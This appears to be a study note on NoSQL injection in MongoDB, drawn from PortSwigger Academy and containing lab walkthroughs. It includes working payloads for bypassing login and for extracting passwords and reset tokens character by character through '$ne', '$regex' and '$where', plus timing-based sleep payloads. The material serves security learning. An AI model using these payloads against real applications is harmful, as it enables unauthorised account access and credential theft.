---
title: NoSQL Injection 🍄
---
- *All the theory here was extracted from [PortSwigger Academy](https://portswigger.net/web-security/learning-paths/nosql-injection/nosql-syntax-injection/nosql-injection/i)* 

## Types of NoSQL injection

There are two different types of NoSQL injection:

- **Syntax injection** - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
- **Operator injection** - This occurs when you can use NoSQL query operators to manipulate queries.

In this topic, we'll look at how to test for NoSQL vulnerabilities in general, then focus on exploiting vulnerabilities in MongoDB, which is the most popular NoSQL database.

## NoSQL syntax injection

You can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application.

If you know the API language of the target database, use special characters and fuzz strings that are relevant to that language. Otherwise, use a variety of fuzz strings to target multiple API languages.

## Detecting syntax injection in MongoDB

Consider a shopping application that displays products in different categories. When the user selects the **Fizzy drinks** category, their browser requests the following URL:

```sql
https://insecure-website.com/product/lookup?category=fizzy
```

This causes the application to send a JSON query to retrieve relevant products from the `product` collection in the MongoDB database:

```sql
this.category == 'fizzy'
```

To test whether the input may be vulnerable, submit a fuzz string in the value of the `category` parameter. An example string for MongoDB is:

```sql
'"`{ ;$Foo} $Foo \xYZ
```

Use this fuzz string to construct the following attack:

```sql
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.

>[!Note]
>NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.
>
In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become 
>
>```sql
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
>```

## Determining which characters are processed

To determine which characters are interpreted as syntax by the application, you can inject individual characters. For example, you could submit `'`, which results in the following MongoDB query:

```sql
this.category == '''
```

If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error. You can confirm this by submitting a valid query string in the input, for example by escaping the quote:

```sql
this.category == '\''
```

If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

## Confirming conditional behavior

After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:

```sql
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x

https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

## Overriding existing conditions

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||1||'`:

```sql
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%31%7c%7c%27
```

This results in the following MongoDB query:

```sql
this.category == 'fizzy'||'1'=='1'
```

As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories.

>[!Warning]
>Take care when injecting a condition that always evaluates to true into a NoSQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If an application uses it when updating or deleting data, for example, this can result in accidental data loss.

You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored. For example, the query may have an additional `this.released` restriction:

```sql
this.category == 'fizzy' && this.released == 1
```

The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:

```sql
https://insecure-website.com/product/lookup?category=fizzy'%00
```

This results in the following NoSQL query:

```sql
this.category == 'fizzy'\u0000' && this.released == 1
```

If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the `fizzy` category are displayed, including unreleased products.

>[!Example]
1. In Burp's browser, access the lab and click on a product category filter.
    
2. In Burp, go to **Proxy > HTTP history**. Right-click the category filter request and select **Send to Repeater**.
    
3. In Repeater, submit a `'` character in the category parameter. Notice that this causes a JavaScript syntax error. This may indicate that the user input was not filtered or sanitized correctly.
    
4. Submit a valid JavaScript payload in the value of the category query parameter. You could use the following payload:
    
    `Gifts'+'`
    
    Make sure to URL-encode the payload by highlighting it and using the `Ctrl-U` hotkey. Notice that it doesn't cause a syntax error. This indicates that a form of server-side injection may be occurring.
    
5. Identify whether you can inject boolean conditions to change the response:
    
    1. Insert a false condition in the category parameter. For example:
        
        `Gifts' && 0 && 'x`
        
        Make sure to URL-encode the payload. Notice that no products are retrieved.
        
    2. Insert a true condition in the category parameter. For example:
        
        `Gifts' && 1 && 'x`
        
        Make sure to URL-encode the payload. Notice that products in the **Gifts** category are retrieved.
        
6. Submit a boolean condition that always evaluates to true in the category parameter. For example:
    
    `Gifts'||1||'`
7. Right-click the response and select **Show response in browser**.
    
8. Copy the URL and load it in Burp's browser. Verify that the response now contains unreleased products.

## NoSQL operator injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.

## Submitting query operators

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

1. Convert the request method from `GET` to `POST`.
2. Change the `Content-Type` header to `application/json`.
3. Add JSON to the message body.
4. Inject query operators in the JSON.

>[!Note]
>You can use the Content Type Converter extension to automatically convert the request method and change a URL-encoded `POST` request to JSON.

## Detecting operator injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a `POST` request:

```json
{"username":"wiener","password":"peter"}
```

Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:

```json
{"username":{"$ne":"invalid"},"password":{"peter"}}
```

If the `$ne` operator is applied, this queries all users where the username is not equal to `invalid`.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

This query returns all login credentials where both the username and password are not equal to `invalid`. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

>[!Example]
>The lab solution

1. In Burp's browser, log in to the application using the credentials `wiener:peter`.
    
2. In Burp, go to **Proxy > HTTP history**. Right-click the `POST /login` request and select **Send to Repeater**.
    
3. In Repeater, test the username and password parameters to determine whether they allow you to inject MongoDB operators:
    
    1. Change the value of the `username` parameter from `"wiener"` to `{"$ne":""}`, then send the request. Notice that this enables you to log in.
    2. Change the value of the `username` parameter from `{"$ne":""}` to `{"$regex":"wien.*"}`, then send the request. Notice that you can also log in when using the `$regex` operator.
    3. With the `username` parameter set to `{"$ne":""}`, change the value of the `password` parameter from `"peter"` to `{"$ne":""}`, then send the request again. Notice that this causes the query to return an unexpected number of records. This indicates that more than one user has been selected.
4. With the password parameter set as `{"$ne":""}`, change the value of the username parameter to `{"$regex":"admin.*"},` then send the request again. Notice that this successfully logs you in as the admin user.
    
5. Right-click the response, then select **Show response in browser**. Copy the URL.
    
6. Paste the URL into Burp's browser to log in as the `administrator` user.

## Exploiting syntax injection to extract data

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.

## Exfiltrating data in MongoDB

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:

`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the `users` collection:

```json
{"$where":"this.username == 'admin'"}
```

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:

```json
admin' && this.password[0] == 'a' || 'a'=='b
```

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:

```json
admin' && this.password.match(/\d/) || 'a'=='b
```

## Identifying field names

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a `password` field, you could submit the following payload:

`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the `username` field exists, so you could send the following payloads:

```json
admin' && this.username!='` `admin' && this.foo!='
```

If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).

If you want to test different field names, you could perform a dictionary attack, by using a wordlist to cycle through different potential field names.

>[!Note]
>You can alternatively use NoSQL operator injection to extract field names character by character. This enables you to identify field names without having to guess or perform a dictionary attack.

>[!Example]
>The lab solution

1. In Burp's browser, access the lab and log in to the application using the credentials `wiener:peter`.
    
2. In Burp, go to **Proxy > HTTP history**. Right-click the `GET /user/lookup?user=wiener` request and select **Send to Repeater**.
    
3. In Repeater, submit a `'` character in the user parameter. Notice that this causes an error. This may indicate that the user input was not filtered or sanitized correctly.
    
4. Submit a valid JavaScript payload in the `user` parameter. For example, you could use `wiener'+'`
    
    Make sure to URL-encode the payload by highlighting it and using the hotkey `Ctrl-U`. Notice that it retrieves the account details for the `wiener` user, which indicates that a form of server-side injection may be occurring.
    
5. Identify whether you can inject boolean conditions to change the response:
    
    1. Submit a false condition in the `user` parameter. For example: `wiener' && '1'=='2`
        
        Make sure to URL-encode the payload. Notice that it retrieves the message `Could not find user`.
        
    2. Submit a true condition in the user parameter. For example: `wiener' && '1'=='1`
        
        Make sure to URL-encode the payload. Notice that it no longer causes an error. Instead, it retrieves the account details for the `wiener` user. This demonstrates that you can trigger different responses for true and false conditions.
        
6. Identify the password length:
    
    1. Change the user parameter to `administrator' && this.password.length < 30 || 'a'=='b`, then send the request.
        
        Make sure to URL-encode the payload. Notice that the response retrieves the account details for the `administrator` user. This indicates that the condition is true because the password is less than 30 characters.
        
    2. Reduce the password length in the payload, then resend the request.
    3. Continue to try different lengths.
    4. Notice that when you submit the value `9`, you retrieve the account details for the `administrator` user, but when you submit the value `8`, you receive an error message because the condition is false. This indicates that the password is 8 characters long.
7. Right-click the request and select **Send to Intruder**.
    
8. In Intruder, enumerate the password:
    
    1. Change the user parameter to `administrator' && this.password[§0§]=='§a§`. This includes two payload positions. Make sure to URL-encode the payload.
    2. Set the attack type to **Cluster bomb**.
    3. In the **Payloads** tab, make sure that **Payload set 1** is selected, then add numbers from 0 to 7 for each character of the password.
    4. Select **Payload set 2**, then add lowercase letters from a to z. If you're using Burp Suite Professional, you can use the built-in `a-z` list.
    5. Click **Start attack**.
    6. Sort the attack results by **Payload 1**, then **Length**. Notice that one request for each character position (0 to 7) has evaluated to true and retrieved the details for the `administrator` user. Note the letters from the **Payload 2** column down.
9. In Burp's browser, log in as the `administrator` user using the enumerated password.

## Exploiting NoSQL operator injection to extract data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.

## Injecting operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a `POST` request:

```json
{"username":"wiener","password":"peter"}
```

To test whether you can inject operators, you could try adding the `$where` operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:

```json
{"username":"wiener","password":"peter", "$where":"0"}

{"username":"wiener","password":"peter", "$where":"1"}
```

If there is a difference between the responses, this may indicate that the JavaScript expression in the `$where` clause is being evaluated.

## Extracting field names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.

## Exfiltrating data using operators

Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the `$regex` operator to extract data character by character.

Consider a vulnerable application that accepts a username and password in the body of a `POST` request. For example:

```json
{"username":"myuser","password":"mypass"}
```

You could start by testing whether the `$regex` operator is processed as follows:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an `a`:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

>[!Example]
>The lab solution

1. In Burp's browser, attempt to log in to the application with username `carlos` and password `invalid`. Notice that you receive an `Invalid username or password` error message.
    
2. In Burp, go to **Proxy > HTTP history**. Right-click the `POST /login` request and select **Send to Repeater**.
    
3. In Repeater, change the value of the password parameter from `"invalid"` to `{"$ne":"invalid"}`, then send the request. Notice that you now receive an `Account locked` error message. You can't access Carlos's account, but this response indicates that the `$ne` operator has been accepted and the application is vulnerable.
    
4. In Burp's browser, attempt to reset the password for the `carlos` account. When you submit the `carlos` username, observe that the reset mechanism involves email verification, so you can't reset the account yourself.
    
5. In Repeater, use the `POST /login` request to test whether the application is vulnerable to JavaScript injection:
    
    1. Add `"$where": "0"` as an additional parameter in the JSON data as follows: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`
    2. Send the request. Notice that you receive an `Invalid username or password` error message.
    3. Change `"$where": "0" to "$where": "1"`, then resend the request. Notice that you receive an `Account locked` error message. This indicates that the JavaScript in the `$where` clause is being evaluated.
6. Right-click the request and select **Send to Intruder**.
    
7. In Intruder, construct an attack to identify all the fields on the user object:
    
    1. Update the `$where` parameter as follows: `"$where":"Object.keys(this)[1].match('^.{}.*')"`
    2. Add two payload positions. The first identifies the character position number, and the second identifies the character itself: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"` (I used `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`)
    3. Set the attack type to **Cluster bomb**.
    4. In the **Payloads** tab, make sure that **Payload set 1** is selected, then set the **Payload type** to **Numbers**. Set the number range, for example from 0 to 20.
    5. Select **Payload set 2** and make sure the **Payload type** is set to **Simple list**. Add all numbers, lower-case letters and upper-case letters as payloads. If you're using Burp Suite Professional, you can use the built-in word lists `a-z`, `A-Z`, and `0-9`.
    6. Click **Start attack**.
    7. Sort the attack results by **Payload 1**, then **Length**, to identify responses with an `Account locked` message instead of the `Invalid username or password` message. Notice that the characters in the **Payload 2** column spell out the name of the parameter: `username`.
    8. Repeat the above steps to identify further JSON parameters. You can do this by incrementing the index of the keys array with each attempt, for example: `"$where":"Object.keys(this)**[2]**.match('^.{}.*')"`
        
        Notice that one of the JSON parameters is for a password reset token.
        
8. Test the identified password reset field name as a query parameter on different endpoints:
    
    1. In **Proxy > HTTP history**, identify the `GET /forgot-password` request as a potentially interesting endpoint, as it relates to the password reset functionality. Right-click the request and select **Send to Repeater**.
    2. In Repeater, submit an invalid field in the URL: `GET /forgot-password?foo=invalid`. Notice that the response is identical to the original response.
    3. Submit the exfiltrated name of the password reset token field in the URL: `GET /forgot-password?YOURTOKENNAME=invalid`. Notice that you receive an `Invalid token` error message. This confirms that you have the correct token name and endpoint.
9. In Intruder, use the `POST /login` request to construct an attack that extracts the value of Carlos's password reset token:
    
    1. Keep the settings from your previous attack, but update the `$where` parameter as follows: `"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"`
        
        Make sure that you replace `YOURTOKENNAME` with the password reset token name that you exfiltrated in the previous step.
        
    2. Click **Start attack**.
    3. Sort the attack results by **Payload 1**, then **Length**, to identify responses with an `Account locked` message instead of the `Invalid username or password` message. Note the letters from the **Payload 2** column down.
10. In Repeater, submit the value of the password reset token in the URL of the `GET / forgot-password` request: `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`.
11. Right-click the response and select **Request in browser > Original session**. Paste this into Burp's browser.
12. Change Carlos's password, then log in as `carlos` to solve the lab.

## Timing based injection

Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

1. Load the page several times to determine a baseline loading time.
2. Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
3. Identify whether the response loads more slowly. This indicates a successful injection.

The following timing based payloads will trigger a time delay if the password beings with the letter `a`:

```json
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'

admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```